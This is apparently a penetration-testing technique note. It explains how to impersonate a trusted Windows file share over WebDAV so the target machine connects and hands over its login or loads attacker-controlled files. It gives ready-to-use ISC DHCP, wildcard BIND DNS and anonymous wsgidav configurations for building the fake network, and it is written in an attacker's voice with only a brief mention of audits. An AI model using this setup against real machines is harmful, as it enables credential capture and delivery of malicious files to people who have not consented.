**Remote share via WebDAV** — serve your own file share that impersonates one the victim's machine trusts, so it connects to you and either authenticates (handing you its login) or loads attacker-controlled files. SMB signing — a tamper-check Windows can require on file-share traffic — would normally block this, but WebDAV, an HTTP-based way to reach the same `\\host\share` (UNC) paths, has no signing, so you downgrade the connection to WebDAV and the attack still works as long as UNC hardening (a Group Policy that forces signing on named paths) is not applied. In practice you stand up a fake network: ISC DHCP hands the target an address, BIND answers every DNS name with your IP, and `wsgidav` serves the files.

## Exploitation

Example: impersonate a specific SMB share during a workstation audit where you may not have access to the legitimate corporate network. In other cases it may be easier to simply intercept communications - here we build a fake network posing as the target network by using the appropriate DNS suffix.

### DHCP setup

ISC DHCP Server hands an address to the target workstation. After setting a static IP on the right interface (here `10.21.23.10`):

```

subnet 10.21.23.0 netmask 255.255.255.0 {
 range 10.21.23.100 10.21.23.200;
 option domain-name "target.domain";
 option domain-name-servers 10.21.23.10;
}

```

### DNS setup

BIND answers all requests with the attacker's IP. Sample zone:

```

$TTL 86400
@ IN SOA target.domain root (
 2017062705
 3600
 900
 604800
 86400
)
@ IN NS server
root IN A 10.21.23.10
* A 10.21.23.10

```

### WebDAV server

`wsgidav` serves the necessary files to the target:

```bash

wsgidav --host=0.0.0.0 --port=80 --root="$(pwd)" --auth anonymous

```

## References

- wsgidav - https://github.com/mar10/wsgidav
